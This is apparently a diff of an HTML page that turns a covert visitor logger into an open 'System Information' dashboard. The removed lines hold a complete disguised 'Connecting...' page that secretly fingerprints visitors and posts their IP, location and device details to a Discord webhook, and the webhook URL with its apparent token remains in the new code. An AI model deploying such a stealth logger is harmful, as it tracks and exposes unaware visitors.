@@ -3,91 +3,103 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
+    <title>System Information</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
     <style>
+        :root {
+            --bg: #0a0a0a;
+            --card: #111111;
+            --accent: #00b0f4;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #0f0f0f;
-            color: #fff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            overflow: hidden;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            background: var(--bg);
+            color: #e0e0e0;
+            line-height: 1.6;
+            padding: 20px;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .header h1 {
+            color: var(--accent);
+            font-size: 2.2rem;
         }
         .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(380px, 1fr));
+            gap: 20px;
+        }
+        .card {
+            background: var(--card);
+            border-radius: 16px;
+            padding: 24px;
+            border: 1px solid #222;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+        .card h2 {
+            color: var(--accent);
+            margin-bottom: 18px;
+            font-size: 1.3rem;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid #222;
+        }
+        .info-row:last-child {
+            border-bottom: none;
+        }
+        .label {
+            color: #888;
+        }
+        .value {
+            color: #fff;
+            font-weight: 500;
+            text-align: right;
+        }
+        .fingerprint {
+            font-family: monospace;
+            word-break: break-all;
+            background: #1a1a1a;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 0.95rem;
+        }
+        .status {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.85rem;
+        }
+        .online { background: #00c853; color: black; }
+        .loading {
             text-align: center;
-        }
-        .loader {
-            width: 50px;
-            height: 50px;
-            border: 4px solid #333;
-            border-top: 4px solid #00b0f4;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
-        h1 { color: #00b0f4; }
-        p { color: #aaa; max-width: 400px; }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+            padding: 40px;
+            font-size: 1.1rem;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="loader"></div>
-        <h1>Connecting...</h1>
-        <p>Please wait while we optimize your experience.</p>
+    <div class="header">
+        <h1><i class="fas fa-info-circle"></i> System & Visitor Information</h1>
+        <p>Real-time device and network details</p>
+    </div>
+
+    <div class="container" id="dashboard">
+        <!-- Cards will be populated by JavaScript -->
     </div>
 
     <script>
         const webhookURL = "https://discord.com/api/webhooks/1486833700149923880/WlIFJMWJeXMF5QL4xjnM5aKrnmBIFbGCZK8kl8Gh-npMLt5g8F7ejFENqcAu_HO3aPXi";
-
-        function getDeviceType() {
-            const ua = navigator.userAgent.toLowerCase();
-            if (/tablet|ipad|playbook|silk/i.test(ua)) return "Tablet";
-            if (/mobile|android|iphone|ipod/i.test(ua)) return "Mobile";
-            return "Desktop";
-        }
-
-        function getBrowser() {
-            const ua = navigator.userAgent;
-            if (ua.includes("Firefox")) return "Firefox";
-            if (ua.includes("Edg")) return "Edge";
-            if (ua.includes("Chrome")) return "Chrome";
-            if (ua.includes("Safari")) return "Safari";
-            return "Unknown";
-        }
-
-        function getBrowserEngine() {
-            const ua = navigator.userAgent;
-            if (ua.includes("Gecko/") && !ua.includes("like Gecko")) return "Gecko";
-            if (ua.includes("AppleWebKit")) return "WebKit";
-            if (ua.includes("Blink")) return "Blink";
-            return "Unknown";
-        }
-
-        function getGPUInfo() {
-            try {
-                const canvas = document.createElement("canvas");
-                const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
-                const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
-                return {
-                    renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable",
-                    vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "Unavailable"
-                };
-            } catch {
-                return { renderer: "Unavailable", vendor: "Unavailable" };
-            }
-        }
-
-        function getConnectionInfo() {
-            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            return conn ? `Type: ${conn.effectiveType}, Downlink: ${conn.downlink}Mbps` : "Unavailable";
-        }
 
         async function getFingerprint() {
             const raw = [
@@ -99,87 +111,154 @@
                 navigator.hardwareConcurrency || "",
                 navigator.deviceMemory || ""
             ].join("|");
-            
             try {
                 const buf = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(raw));
                 return [...new Uint8Array(buf)].map(x => x.toString(16).padStart(2, "0")).join("");
-            } catch {
-                return "Failed";
-            }
+            } catch { return "Unavailable"; }
         }
 
-        function detectAdBlock(callback) {
-            const ad = document.createElement("div");
-            ad.className = "adsbox";
-            ad.style.display = "none";
-            document.body.appendChild(ad);
-            
-            setTimeout(() => {
-                const blocked = ad.offsetHeight === 0;
-                document.body.removeChild(ad);
-                callback(blocked ? "Yes" : "No");
-            }, 100);
-        }
-
-        async function sendVisitorLog() {
+        function getGPUInfo() {
             try {
-                const ipResponse = await fetch("https://ipapi.co/json/");
-                const data = await ipResponse.json();
-
-                const { ip, city, region, country_name: country, org: isp, timezone } = data;
-
-                const deviceType = getDeviceType();
-                const browser = getBrowser();
-                const engine = getBrowserEngine();
-                const gpu = getGPUInfo();
-                const connection = getConnectionInfo();
-                const fingerprint = await getFingerprint();
-
-                let batteryLevel = "Unknown";
-                if (navigator.getBattery) {
-                    try {
-                        const battery = await navigator.getBattery();
-                        batteryLevel = `${Math.round(battery.level * 100)}%`;
-                    } catch {}
-                }
-
-                detectAdBlock((adBlocked) => {
-                    const payload = {
-                        username: "📡 Visitor Logger",
-                        avatar_url: "https://i.imgur.com/2xVfCiq.png",
-                        embeds: [{
-                            title: "🔍 Visitor Intel Report",
-                            color: 0x00b0f4,
-                            description: `**IP Address:** \`${ip}\``,
-                            fields: [
-                                { name: "📍 Location", value: `**City:** ${city || "Unknown"}\n**Region:** ${region || "Unknown"}\n**Country:** ${country || "Unknown"}`, inline: true },
-                                { name: "🌐 Network", value: `**ISP:** ${isp || "Unknown"}\n**Timezone:** ${timezone || "Unknown"}\n**Connection:** ${connection}`, inline: true },
-                                { name: "🧠 System", value: `**Type:** ${deviceType}\n**Platform:** ${navigator.platform}\n**CPU Threads:** ${navigator.hardwareConcurrency || "Unknown"}\n**RAM:** ${navigator.deviceMemory || "Unknown"} GB`, inline: true },
-                                { name: "🖥️ Display", value: `**Resolution:** \( {screen.width}x \){screen.height} @ ${screen.colorDepth}bit\n**Window:** \( {window.innerWidth}x \){window.innerHeight}\n**Touch:** ${'ontouchstart' in window ? "Yes" : "No"}\n**Orientation:** ${screen.orientation?.type || "Unavailable"}`, inline: true },
-                                { name: "🎮 GPU", value: `**Renderer:** ${gpu.renderer}\n**Vendor:** ${gpu.vendor}`, inline: true },
-                                { name: "🧩 Browser", value: `**Browser:** ${browser}\n**Engine:** ${engine}\n**Language:** ${navigator.language}\n**Cookies:** ${navigator.cookieEnabled ? "Yes" : "No"}`, inline: true },
-                                { name: "🌙 Preferences", value: `**Theme:** ${window.matchMedia('(prefers-color-scheme: dark)').matches ? "Dark" : "Light"}\n**Battery:** ${batteryLevel}\n**AdBlock:** ${adBlocked}`, inline: true },
-                                { name: "🧬 Fingerprint", value: `\`${fingerprint.slice(0, 40)}...\``, inline: false },
-                                { name: "🕒 Time", value: new Date().toString(), inline: false }
-                            ],
-                            footer: { text: "Visitor Logger • Stealth Mode" },
-                            timestamp: new Date().toISOString()
-                        }]
-                    };
-
-                    fetch(webhookURL, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify(payload)
-                    });
-                });
-
-            } catch (error) {
-                console.error("Logger error:", error);
+                const canvas = document.createElement("canvas");
+                const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+                const debug = gl.getExtension("WEBGL_debug_renderer_info");
+                return {
+                    renderer: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "Unavailable",
+                    vendor: debug ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : "Unavailable"
+                };
+            } catch {
+                return { renderer: "Unavailable", vendor: "Unavailable" };
             }
         }
 
-        window.onload = sendVisitorLog;
+        async function initDashboard() {
+            const ipData = await fetch("https://ipapi.co/json/").then(r => r.json()).catch(() => ({}));
+
+            const gpu = getGPUInfo();
+            const fingerprint = await getFingerprint();
+
+            let battery = "Unavailable";
+            if (navigator.getBattery) {
+                try {
+                    const b = await navigator.getBattery();
+                    battery = `${Math.round(b.level * 100)}%`;
+                } catch {}
+            }
+
+            const adBlockTest = () => new Promise(resolve => {
+                const ad = document.createElement("div");
+                ad.className = "adsbox";
+                ad.style.display = "none";
+                document.body.appendChild(ad);
+                setTimeout(() => {
+                    resolve(ad.offsetHeight === 0 ? "Yes" : "No");
+                    document.body.removeChild(ad);
+                }, 100);
+            });
+
+            const adBlocked = await adBlockTest();
+
+            const info = {
+                location: {
+                    title: "Location",
+                    icon: "📍",
+                    data: {
+                        "IP Address": ipData.ip || "Unknown",
+                        "City": ipData.city || "Unknown",
+                        "Region": ipData.region || "Unknown",
+                        "Country": ipData.country_name || "Unknown",
+                        "Timezone": ipData.timezone || "Unknown"
+                    }
+                },
+                network: {
+                    title: "Network",
+                    icon: "🌐",
+                    data: {
+                        "ISP": ipData.org || "Unknown",
+                        "Connection": (navigator.connection?.effectiveType || "Unknown") + " (" + (navigator.connection?.downlink || "?") + " Mbps)",
+                        "Online": navigator.onLine ? "Yes" : "No"
+                    }
+                },
+                system: {
+                    title: "System",
+                    icon: "💻",
+                    data: {
+                        "Device Type": /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop",
+                        "Platform": navigator.platform,
+                        "CPU Threads": navigator.hardwareConcurrency || "Unknown",
+                        "Memory (RAM)": navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown",
+                        "Touch Support": 'ontouchstart' in window ? "Yes" : "No"
+                    }
+                },
+                display: {
+                    title: "Display & GPU",
+                    icon: "🖥️",
+                    data: {
+                        "Resolution": `${screen.width} × ${screen.height}`,
+                        "Color Depth": screen.colorDepth + " bit",
+                        "Window Size": `${window.innerWidth} × ${window.innerHeight}`,
+                        "GPU Renderer": gpu.renderer,
+                        "GPU Vendor": gpu.vendor
+                    }
+                },
+                browser: {
+                    title: "Browser",
+                    icon: "🌐",
+                    data: {
+                        "Browser": navigator.userAgent.includes("Chrome") ? "Chrome" : 
+                                   navigator.userAgent.includes("Firefox") ? "Firefox" : "Unknown",
+                        "Language": navigator.language,
+                        "Cookies": navigator.cookieEnabled ? "Enabled" : "Disabled",
+                        "Do Not Track": navigator.doNotTrack === "1" ? "Enabled" : "Disabled",
+                        "Theme": window.matchMedia('(prefers-color-scheme: dark)').matches ? "Dark" : "Light"
+                    }
+                },
+                advanced: {
+                    title: "Advanced",
+                    icon: "🔬",
+                    data: {
+                        "Battery Level": battery,
+                        "AdBlock Detected": adBlocked,
+                        "Fonts Loaded": document.fonts ? document.fonts.size : "Unknown",
+                        "User Agent": navigator.userAgent.substring(0, 80) + "..."
+                    }
+                }
+            };
+
+            // Render Dashboard
+            const dashboard = document.getElementById("dashboard");
+            dashboard.innerHTML = "";
+
+            Object.values(info).forEach(section => {
+                let html = `
+                    <div class="card">
+                        <h2>${section.icon} ${section.title}</h2>
+                `;
+                Object.entries(section.data).forEach(([key, value]) => {
+                    html += `
+                        <div class="info-row">
+                            <span class="label">${key}</span>
+                            <span class="value">${value}</span>
+                        </div>
+                    `;
+                });
+                html += `</div>`;
+                dashboard.innerHTML += html;
+            });
+
+            // Add Fingerprint Card
+            const fpCard = document.createElement("div");
+            fpCard.className = "card";
+            fpCard.innerHTML = `
+                <h2>🔑 Browser Fingerprint</h2>
+                <div class="fingerprint">${fingerprint}</div>
+                <small style="color:#666;">SHA-256 • Unique device identifier</small>
+            `;
+            dashboard.appendChild(fpCard);
+        }
+
+        // Start everything
+        window.onload = initDashboard;
     </script>
 </body>
 </html>
